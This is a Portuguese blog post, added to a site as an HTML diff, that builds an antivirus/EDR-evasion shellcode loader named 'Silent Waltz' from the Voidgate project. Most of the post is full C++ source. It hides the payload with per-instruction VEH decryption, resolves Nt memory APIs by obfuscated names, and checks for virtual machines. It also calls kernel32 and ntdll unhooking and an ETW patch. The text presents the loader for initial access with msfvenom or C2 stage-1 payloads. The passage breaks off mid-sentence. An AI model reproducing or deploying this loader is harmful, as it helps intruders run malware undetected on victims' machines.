@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="../images/50.png" type="image/x-icon">
+  <title>Creating-Loader</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/languages/cpp.min.js"></script>
+  <script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+      document.querySelectorAll('pre code').forEach((block) => {
+        hljs.highlightElement(block);
+      });
+    });
+  </script>
+  <style>
+    ::-webkit-scrollbar {
+      width: 10px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #333;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #555;
+      border-radius: 5px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #777;
+    }
+
+    html {
+      scrollbar-color: #555 #333;
+      scrollbar-width: thin;
+    }
+  </style>
+  <style>
+    pre {
+      background-color: #1e1e1e;
+      color: #ffffff;
+      padding: 15px;
+      border-radius: 8px;
+      overflow-x: auto;
+      font-family: 'Courier New', monospace;
+      font-size: 14px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+    }
+  </style>
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../text_style.css">
+  <link rel="stylesheet" href="../dimensao.css">
+  <link rel="stylesheet" href="../background.css">
+  <link rel="stylesheet" href="../head_style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+</head>
+
+<body>
+  <header style="height: 55px;">
+    <div class="logo">
+      <img src="../images/50.png" height="40" alt="Vith0r logo"
+        style="position: relative; left: none; height: 42px; width: 42px; top: -1px;">
+      <h2>
+        <a href="https://vith0r.github.io"
+          style="color: rgba(255, 255, 255, 0.7); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(139, 92, 246, 0.7); font-family: 'Press Start 2P', sans-serif; font-size: 19px;">
+          &nbsp;VITHOR
+        </a>
+      </h2>
+    </div>
+    <nav>
+      <div class="toggle-container">
+        <a href="../whoami.html">
+          <button class="tutorials-toggle"><i></i>Whoami</button>
+        </a>
+        <a href="../posts.html">
+          <button class="tools-toggle"><i></i>Posts</button>
+        </a>
+        <a href="../projects.html">
+          <button class="tools-toggle"><i></i>Projects</button>
+        </a>
+      </div>
+    </nav>
+  </header>
+  <script>
+    const element = document.querySelector('.logo h2 a');
+    const targetWord = "VITHOR";
+
+    function getRandomString(length) {
+      const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+      let result = '';
+      for (let i = 0; i < length; i++) {
+        result += characters.charAt(Math.floor(Math.random() * characters.length));
+      }
+      return result;
+    }
+
+    function animateRandomization(element, targetWord) {
+      const originalWord = targetWord.split('');
+      let iterations = 0;
+      const maxIterations = 15;
+      let currentWord = getRandomString(targetWord.length).split('');
+      let currentIndex = 0;
+
+      element.style.display = 'inline-block';
+      element.style.width = `${element.offsetWidth}px`;
+      element.style.position = 'relative';
+      element.style.left = '5px';
+
+      const interval = setInterval(() => {
+        if (iterations < maxIterations) {
+          currentWord = getRandomString(targetWord.length).split('');
+          iterations++;
+        } else {
+          if (currentIndex < targetWord.length) {
+            currentWord[currentIndex] = originalWord[currentIndex];
+            currentIndex++;
+          } else {
+            clearInterval(interval);
+          }
+        }
+        element.textContent = currentWord.join('');
+      }, 60);
+    }
+
+    setInterval(() => {
+      animateRandomization(element, targetWord);
+    }, 10000);
+
+    element.addEventListener('mouseover', () => {
+      animateRandomization(element, targetWord);
+    });
+
+    animateRandomization(element, targetWord);
+  </script>
+
+  <body>
+    <div class="grain-header"></div>
+    <main>
+      <div class="box">
+        <h1
+          style="color: rgba(255, 255, 255, 0.9); text-decoration: none; position: relative; text-shadow: 3px 3px 5px rgba(60, 122, 255, 0.8);">
+          Criando carregador para contornar AV/EDR</h1>
+        <br>
+        <p>Posted Sep 1, 2024. 12 min read</p>
+        <br>
+        <div class="post-author">
+          <a href="https://github.com/Vith0r" target="_blank">
+            <img src="https://avatars.githubusercontent.com/u/124220594?v=4" alt="Vithor logo">
+            <span>Vithor</span>
+          </a>
+        </div>
+
+        <article>
+          <div style="font-size: 16px;">
+            <p>Bom, no post de hoje vou mostrar um carregador simples que fiz para conseguir contornar alguns antivírus
+              bastante utilizados hoje em dia.</p>
+            <br>
+            <div style="padding: 10px; background-color: rgba(60, 122, 255, 0.2); color: white; margin-bottom: 10px;">
+              ⚠️ As informações que você encontrar neste post, técnicas, códigos, provas de conceito ou qualquer outra
+              coisa são estritamente para fins educacionais.
+            </div>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Obfusheader</h2>
+            <p>Vou estar utilizando o projeto <a href="https://github.com/ac3ss0r/obfusheader.h"
+                href="https://github.com/ac3ss0r/obfusheader.h" style="color: #9E2525;">Obfusheader</a> para conseguir
+              esconder strings. É um projeto fácil de utilizar.</p>
+            <br>
+            <p><img src="https://telegra.ph/file/7d46c99226b990aa9a9e2.png" alt="Obfusheader"
+                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Voidgate</h2>
+            <p><a href="https://github.com/vxCrypt0r/Voidgate/" href="https://github.com/vxCrypt0r/Voidgate/"
+                style="color: #9E2525;">Voidgate</a> vai ser modificado e usado para executar nossa payload <a
+                href="https://github.com/vxCrypt0r/Voidgate/" href="https://github.com/vxCrypt0r/Voidgate/"
+                style="color: #9E2525;">Voidgate</a> é um projeto que utiliza uma técnica que pode ser usada para <span
+                style="color: #9E2525;">contornar scanners de memoria de AV/EDR</span>. ele pode ser usado para esconder
+              shellcodes bem conhecidos e detectados <span style="color: #9E2525;">como as do msfvenom</span> executando
+              <span style="color: #9E2525;">on-the-fly decryption of individual encrypted assembly instructions</span>,
+              tornando assim os scanners de memória inúteis para aquela página de memória específica.
+            </p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Como funciona:
+            </h3>
+            <p>Está técnica criará uma região de memória <span style="color: #9E2525;">PAGE_EXECUTE_READWRITE</span>
+              onde as instruções de montagem criptografadas serão armazenadas. O shellcode será encapsulado em algum
+              preenchimento. O programa definirá um <span style="color: #9E2525;">Hardware Breakpoint</span> (HWBP) no
+              ponto de entrada do shellcode.<br>Em seguida, o programa instalará um <span
+                style="color: #9E2525;">Vectored Exception Handler</span> (VEH). Este VEH basicamente agirá como um
+              <span style="color: #9E2525;">depurador</span>, percorrendo o código passo a passo, lendo o registro de
+              ponteiro de instrução (RIP) para cada exceção <span style="color: #9E2525;">SINGLE STEP</span> recebida
+              pelo VEH e descriptografando os próximos 16 bytes (comprimento máximo de instrução de montagem x64) onde o
+              RIP aponta. O VEH também criptografa de volta a instrução descriptografada anteriormente, garantindo que o
+              restante do shellcode permaneça sempre criptografado, com exceção da única instrução de montagem
+              atualmente em execução. Depois disso, ele continuará a execução, com o <span style="color: #9E2525;">TRAP
+                FLAG</span> configurado no registro Eflags. Isso garantirá que a próxima instrução de montagem também
+              acione uma exceção de ponto de interrupção que o VEH pode manipular.<br>Após a instalação do VEH, a
+              execução do <span style="color: #9E2525;">thread principal</span> será redirecionada para o <span
+                style="color: #9E2525;">payload entrypoint</span>. Quando o HWBP for acionado no entrypoint, o VEH
+              parará em cada instrução de montagem executada, executará a descriptografia da próxima instrução de
+              montagem e criptografará a instrução criptografada anterior, que é salva como uma variável global.<br>Ao
+              fazer isso, basicamente <span style="color: #9E2525;">uma única instrução de montagem é descriptografada
+                por vez</span>, com o restante do <span style="color: #9E2525;">payload permanecendo
+                criptografado</span>.
+            </p>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Limitações:</h3>
+            <ul>
+              <li style="margin-left: 0;"><strong></strong>
+                <p>NOTA: Esta técnica é ideal para obter um acesso <span style="color: #9E2525;">inicial</span> usando
+                  um shellcode <span style="color: #9E2525;">básico</span> como msfvenom ou shells revers
+                  personalizados. Isso também pode ser usado como uma carga útil inicial do estágio 1 que baixa o
+                  restante da carga útil do servidor C2.</p>
+              </li>
+              <li style="margin-left: 0;"><strong></strong>
+                <p>NOTA: Esta técnica não é compatível com todas as cargas úteis (como carregadores reflexivos). Abaixo
+                  está uma lista de limitações atuais:</p>
+              </li>
+            </ul>
+            <ol style="list-style-type: none; padding-left: 0;">
+              <li style="margin-left: 0;"><strong>1</strong> Como o <span style="color: #9E2525;">VEH</span> será
+                acionado para <span style="color: #9E2525;">EACH ASSEMBLY INSTRUCTION</span> executado no shellcode, a
+                velocidade de execução do shellcode será drasticamente reduzida. Para cada instrução de montagem que a
+                CPU executa, o VEH executará pelo menos 300 instruções ASM adicionais para executar a descriptografia,
+                criptografia e restauração da execução para o thread principal. Se o shellcode fornecido for otimizado
+                para tamanho menor em relação ao desempenho (como msfvenom), a execução da carga útil será mais lenta.
+                Pode levar bastante tempo (dependendo da CPU) para executar um MSFVENOM. Isso acontece porque o
+                shellcode específico usado pelo msfvenom está sacrificando o desempenho para obter um tamanho menor de
+                payload.</li>
+              <li style="margin-left: 0;"><strong>2</strong> Se o shellcode chamar <span
+                  style="color: #9E2525;">NtCreateThread</span> ou qualquer um de seus wrappers em Kernelbase.dll com o
+                <span style="color: #9E2525;">entrypoint dentro do shellcode</span>, o payload <span
+                  style="color: #9E2525;">não funcionará</span>, pois o VEH não será acionado para essa execução de
+                thread, pois não há <span style="color: #9E2525;">nenhum HWBP instalado no entrypoint do thread
+                  recém-criado</span>. (Trabalho em andamento - será implementado mais adiante neste repositório)
+              </li>
+              <li style="margin-left: 0;"><strong>3</strong> Se o shellcode tiver alguns <span
+                  style="color: #9E2525;">valores/variáveis ​​armazenados dentro de si</span> (por exemplo, tendo a
+                string bruta &quot;powershell.exe&quot; que é referenciada por meio de um deslocamento em uma chamada
+                para WinExec WINAPI) ou algum número <span style="color: #9E2525;">salvo em um deslocamento</span>, e o
+                shellcode tentará carregá-lo ou referenciá-lo em algum lugar, o programa não funcionará, pois a variável
+                ou string específica <span style="color: #9E2525;">será criptografada</span> e o VEH não a
+                descriptografará.</li>
+            </ol>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Voidgate</h3>
+            <p>Bom, o projeto Voidgate já está sendo detectado pelo Windows Defender.</p>
+            <br>
+            <p><img src="https://telegra.ph/file/9fe14647d3c21cf91bca0.png" alt="Voidgate"
+                style="max-width: 100%; height: auto; width: 600px; display: block; margin: 20px auto;"></p>
+            <br>
+            <p>Então se dermos uma olhada rápida no código, logo saberemos uma coisa bem simples que podemos fazer para
+              reviver o projeto e torná-lo menos detectável.</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;payload.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Voidgate.h&quot;</span></span>
+
+BYTE payload[] = { ...SHELLCODE... }; 
+DWORD payload_size = <span class="hljs-built_in">sizeof</span>(payload);
+
+<span class="hljs-comment">//XOR key for the encrypted payload</span>
+std::string key = <span class="hljs-string">&quot;0dAd2!@BS1dtdCgPMWoA&quot;</span>;
+
+<span class="hljs-function">INT <span class="hljs-title">main</span><span class="hljs-params">()</span>
+</span>{
+    DWORD memory_size = SHELLCODE_PADDING + payload_size + SHELLCODE_PADDING;
+    PVOID heap_memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, memory_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    <span class="hljs-keyword">if</span> (!heap_memory)
+    {
+        <span class="hljs-built_in">LogWinapiError</span>(<span class="hljs-string">&quot;VirtualAlloc&quot;</span>);
+        <span class="hljs-keyword">return</span> EXIT_FAILURE;
+    }
+    payload_lower_bound = (DWORD64)heap_memory;
+    payload_upper_bound = payload_lower_bound + memory_size;
+	
+    <span class="hljs-built_in">memset</span>(heap_memory, <span class="hljs-string">&#x27;\x90&#x27;</span>, memory_size);
+    PVOID payload_entry = (PBYTE)heap_memory + SHELLCODE_PADDING;
+    <span class="hljs-built_in">memcpy</span>(payload_entry, payload, payload_size);
+
+    payload_base = (DWORD64)payload_entry;
+    DWORD status = <span class="hljs-built_in">SetHardwareBreakpoint</span>(payload_entry);
+    PVOID veh = <span class="hljs-built_in">AddVectoredExceptionHandler</span>(<span class="hljs-number">1</span>, &amp;VehDecryptHeapAsm);
+    <span class="hljs-keyword">if</span> (veh)
+    {
+        std::cout &lt;&lt; <span class="hljs-string">&quot;Executing the payload with VEH ASM decryption... This may take a while depending on the efficiency of the shellcode...&quot;</span> &lt;&lt; std::endl;
+        VoidGate vg = (VoidGate)payload_entry;
+        <span class="hljs-built_in">vg</span>();
+    }
+
+    <span class="hljs-comment">//Cleanup</span>
+    <span class="hljs-built_in">VirtualFree</span>(heap_memory, <span class="hljs-number">0</span>, MEM_RELEASE);
+    <span class="hljs-keyword">return</span> EXIT_SUCCESS;
+}
+</pre>
+            <br>
+            <p>Como podemos ver, o projeto utiliza APIs como <span style="color: #9E2525;">VirtualAlloc</span>, <span
+                style="color: #9E2525;">memcpy</span>, <span style="color: #9E2525;">VirtualFree</span>. Então, podemos
+              fazer o uso de APIs Nt. Para quem se esqueceu do que são, abaixo uma imagem para melhor entendimento:</p>
+            <br>
+            <p><img src="https://telegra.ph/file/4d8fb25cc244a8274caaa.png" alt="NT"
+                style="max-width: 100%; height: 420px; width: 700px; display: block; margin: 20px auto;"></p>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Detecção de
+              máquinas virtuais</h2>
+            <p>Bom, como eu sou um belo de um preguiçoso e não quero ficar sofrendo pensando em métodos de detecção de
+              máquinas virtuais, vou utilizar o projeto <a href="https://github.com/kernelwernel/VMAware"
+                href="https://github.com/kernelwernel/VMAware" style="color: #9E2525;">VMAware</a> que é uma biblioteca
+              C++ multiplataforma para detecção de máquinas virtuais que apresenta mais de 100 técnicas exclusivas de
+              detecção de VM para facilitar nossa vida.</p>
+            <p>Bom, o código do VoidGate vai ser modificado para utilizar APIs NT. Note que já vou estar utilizando o
+              Obfusheader, e também lembrando que não vi necessidade de alterar nada no <span
+                style="color: #9E2525;">Voidgate.cpp</span> e no <span style="color: #9E2525;">Voidgate.h</span> e sim o
+              nome do loader será Silent Waltz, em referência a Kaito de HxH pq? também não sei.</p>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;psapi.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ntstatus.h&gt;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;payload.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;Voidgate.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;obfusheader.h&quot;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vmaware_check.hpp&quot;</span></span>
+
+<span class="hljs-meta">#<span class="hljs-keyword">define</span> NT_SUCCESS(Status) ((NTSTATUS)(Status) &gt;= 0)</span>
+
+<span class="hljs-comment">// link: https://learn.microsoft.com/en-us/windows/console/console-screen-buffers#character-attributes</span>
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">SetConsoleColor</span><span class="hljs-params">(WORD color)</span> </span>{
+	HANDLE hConsole = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+	<span class="hljs-built_in">SetConsoleTextAttribute</span>(hConsole, color);
+}
+
+<span class="hljs-comment">// link: http://undocumented.ntinternals.net/</span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtAllocateVirtualMemory_t)</span><span class="hljs-params">(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    ULONG_PTR ZeroBits,
+    PSIZE_T RegionSize,
+    ULONG AllocationType,
+    ULONG Protect
+    )</span></span>;
+
+<span class="hljs-comment">// link: http://undocumented.ntinternals.net/</span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtFreeVirtualMemory_t)</span><span class="hljs-params">(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG FreeType
+    )</span></span>;
+
+<span class="hljs-comment">// link: http://undocumented.ntinternals.net/</span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtWriteVirtualMemory_t)</span><span class="hljs-params">(
+    HANDLE ProcessHandle,
+    PVOID BaseAddress,
+    PVOID Buffer,
+    SIZE_T BufferSize,
+    PSIZE_T NumberOfBytesWritten
+    )</span></span>;
+
+<span class="hljs-comment">// link: http://undocumented.ntinternals.net/</span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtProtectVirtualMemory_t)</span><span class="hljs-params">(
+    HANDLE ProcessHandle,
+    PVOID* BaseAddress,
+    PSIZE_T RegionSize,
+    ULONG NewProtect,
+    PULONG OldProtect
+    )</span></span>;
+
+<span class="hljs-comment">// link: http://undocumented.ntinternals.net/</span>
+<span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span><span class="hljs-params">(NTAPI* NtSetInformationThread_t)</span><span class="hljs-params">(
+    HANDLE ThreadHandle,
+    THREAD_INFORMATION_CLASS ThreadInformationClass,
+    PVOID ThreadInformation,
+    ULONG ThreadInformationLength
+    )</span></span>;
+
+<span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;
+T <span class="hljs-title">GetNtFunction</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* funcName)</span> </span>{
+	HMODULE ntdll = <span class="hljs-built_in">GetModuleHandleW</span>(<span class="hljs-built_in">OBF</span>(<span class="hljs-string">L&quot;ntdll.dll&quot;</span>));
+	<span class="hljs-keyword">if</span> (!ntdll) {
+		<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+		std::cerr &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;Failed to get handle to ntdll.dll&quot;</span>) &lt;&lt; std::endl;
+		<span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
+	}
+	<span class="hljs-keyword">return</span> <span class="hljs-built_in">reinterpret_cast</span>&lt;T&gt;(<span class="hljs-built_in">GetProcAddress</span>(ntdll, funcName));
+}
+
+BYTE payload[] = { ...SHELLCODE... };
+DWORD payload_size = <span class="hljs-built_in">sizeof</span>(payload);
+
+std::string key = <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;0dAd2!@BS1dtdCgPMWoA&quot;</span>);
+
+<span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">LogWinapiError</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* functionName)</span> </span>{
+	<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+    std::cerr &lt;&lt; functionName &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot; failed with error code &quot;</span>) &lt;&lt; <span class="hljs-built_in">GetLastError</span>() &lt;&lt; std::endl;
+}
+
+<span class="hljs-function">INT <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+	<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+	std::cout &lt;&lt; <span class="hljs-string">R&quot;(
+	_________.__.__                 __     __      __        .__   __          
+	/   _____/|__|  |   ____   _____/  |_  /  \    /  \_____  |  |_/  |_________
+	\_____  \ |  |  | _/ __ \ /    \   __\ \   \/\/   /\__  \ |  |\   __\___   /
+	/        \|  |  |_\  ___/|   |  \  |    \        /  / __ \|  |_|  |  /    / 
+	/_______  /|__|____/\___  &gt;___|  /__|     \__/\  /  (____  /____/__| /_____ \
+        \/              \/     \/              \/        \/                \/
+    )&quot;</span> <span class="hljs-string">&quot;\n\n&quot;</span> &lt;&lt; std::endl;
+
+	HANDLE hConsole = <span class="hljs-built_in">GetStdHandle</span>(STD_OUTPUT_HANDLE);
+	CONSOLE_SCREEN_BUFFER_INFO consoleInfo;
+	<span class="hljs-built_in">GetConsoleScreenBufferInfo</span>(hConsole, &amp;consoleInfo);
+	WORD originalColor = consoleInfo.wAttributes;
+
+	<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
+	std::cout &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;[ Detecting virtual machines with VMAware ]\n&quot;</span>);
+	
+	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">isRunningInVM</span>()) {
+	<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+	std::cout &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;[!] Virtual machine detected!&quot;</span>) &lt;&lt; <span class="hljs-string">&quot;\n\n&quot;</span>;
+	<span class="hljs-comment">//HANDLE hProcess = GetCurrentProcess();</span>
+	<span class="hljs-comment">//TerminateProcess(hProcess, 1);</span>
+	}
+	<span class="hljs-keyword">else</span> {
+	<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+	std::cout &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;[#] No virtual machine detected!&quot;</span>) &lt;&lt; <span class="hljs-string">&quot;\n\n&quot;</span>;
+	}
+
+	<span class="hljs-built_in">UnhookingK32</span>(); <span class="hljs-built_in">UnhookingNT</span>(); <span class="hljs-built_in">ETWPATCH</span>();
+
+    <span class="hljs-keyword">auto</span> NtAllocateVirtualMemory = <span class="hljs-built_in">GetNtFunction</span>&lt;NtAllocateVirtualMemory_t&gt;(<span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtAllocateVirtualMemory&quot;</span>));
+    <span class="hljs-keyword">auto</span> NtFreeVirtualMemory = <span class="hljs-built_in">GetNtFunction</span>&lt;NtFreeVirtualMemory_t&gt;(<span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtFreeVirtualMemory&quot;</span>));
+    <span class="hljs-keyword">auto</span> NtWriteVirtualMemory = <span class="hljs-built_in">GetNtFunction</span>&lt;NtWriteVirtualMemory_t&gt;(<span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtWriteVirtualMemory&quot;</span>));
+    <span class="hljs-keyword">auto</span> NtProtectVirtualMemory = <span class="hljs-built_in">GetNtFunction</span>&lt;NtProtectVirtualMemory_t&gt;(<span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtProtectVirtualMemory&quot;</span>));
+    <span class="hljs-keyword">auto</span> NtSetInformationThread = <span class="hljs-built_in">GetNtFunction</span>&lt;NtSetInformationThread_t&gt;(<span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtSetInformationThread&quot;</span>));
+
+    <span class="hljs-keyword">if</span> (!NtAllocateVirtualMemory || !NtFreeVirtualMemory || !NtWriteVirtualMemory || !NtProtectVirtualMemory || !NtSetInformationThread) {
+		<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;Failed to resolve one or more NT Native API functions.&quot;</span>) &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> EXIT_FAILURE;
+    }
+
+    DWORD memory_size = SHELLCODE_PADDING + payload_size + SHELLCODE_PADDING;
+
+    PVOID heap_memory = <span class="hljs-literal">nullptr</span>;
+    SIZE_T size = memory_size;
+    NTSTATUS status = <span class="hljs-built_in">NtAllocateVirtualMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;heap_memory, <span class="hljs-number">0</span>, &amp;size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">NT_SUCCESS</span>(status)) {
+		<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtAllocateVirtualMemory failed with status: &quot;</span>) &lt;&lt; status &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> EXIT_FAILURE;
+    }
+
+    payload_lower_bound = (DWORD64)heap_memory;
+    payload_upper_bound = payload_lower_bound + memory_size;
+
+    <span class="hljs-built_in">memset</span>(heap_memory, <span class="hljs-string">&#x27;\x90&#x27;</span>, memory_size);
+    PVOID payload_entry = (PBYTE)heap_memory + SHELLCODE_PADDING;
+    SIZE_T written_size = payload_size;
+    status = <span class="hljs-built_in">NtWriteVirtualMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), payload_entry, payload, payload_size, &amp;written_size);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">NT_SUCCESS</span>(status)) {
+		<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtWriteVirtualMemory failed with status: &quot;</span>) &lt;&lt; status &lt;&lt; std::endl;
+        <span class="hljs-keyword">return</span> EXIT_FAILURE;
+    }
+
+    payload_base = (DWORD64)payload_entry;
+
+    <span class="hljs-comment">// Este passo não é modificado</span>
+    DWORD breakStatus = <span class="hljs-built_in">SetHardwareBreakpoint</span>(payload_entry);
+
+    <span class="hljs-comment">// Instalar VEH para lidar com a descriptografia/encriptação do payload após cada instrução ASM executada pelo payload</span>
+    PVOID veh = <span class="hljs-built_in">AddVectoredExceptionHandler</span>(<span class="hljs-number">1</span>, &amp;VehDecryptHeapAsm);
+    <span class="hljs-keyword">if</span> (veh) {
+		<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+        std::cout &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;Executing the payload with VEH ASM decryption...\n&quot;</span>) &lt;&lt; std::endl;
+        VoidGate vg = (VoidGate)payload_entry;
+        <span class="hljs-built_in">vg</span>();
+    }
+
+    SIZE_T free_size = memory_size;
+    status = <span class="hljs-built_in">NtFreeVirtualMemory</span>(<span class="hljs-built_in">GetCurrentProcess</span>(), &amp;heap_memory, &amp;free_size, MEM_RELEASE);
+    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">NT_SUCCESS</span>(status)) {
+		<span class="hljs-built_in">SetConsoleColor</span>(FOREGROUND_RED | FOREGROUND_INTENSITY);
+        std::cerr &lt;&lt; <span class="hljs-built_in">OBF</span>(<span class="hljs-string">&quot;NtFreeVirtualMemory failed with status: &quot;</span>) &lt;&lt; status &lt;&lt; std::endl;
+    }
+
+    <span class="hljs-keyword">return</span> EXIT_SUCCESS;
+}
+</pre>
+            <br>
+            <h3 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">
+              vmaware_check.hpp e vmcheck.cpp</h3><br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">#pragma once
+bool isRunningInVM();
+</pre>
+            <br>
+            <pre
+              style="background-color: rgb(29, 31, 33); padding: 15px; border-radius: 8px; overflow-x: auto; color: #fff;">#include &quot;vmaware.hpp&quot;
+
+bool isRunningInVM() {
+    return VM::detect();
+}
+</pre>
+            <br>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">ETW Patch</h2>
+            <p>Bom, não vou fornecer o código porque quero fazer um post focado apenas no ETW :)</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">Kernel32
+              Unhooking</h2>
+            <p>Vai ser praticamente o mesmo código que utilizei no post anterior.</p>
+            <h2 style="color: rgb(60, 122, 255); margin-top: 8px; margin-bottom: 8px; font-size: 24px;">NtDll Unhooking
+            </h2>
+            <p>Bom, eu queria ter utilizado a técnica de <span style="color: #9E2525;">ReflectiveNtdll</span>, mas
+              fiquei com preguiça, Então, apenas modifiquei o código feito no post anterior para, em vez de realizar o
+              unhooking da <span style="color: #9E2525;">kernel32.dll</span>, realizar o unhooking da <span
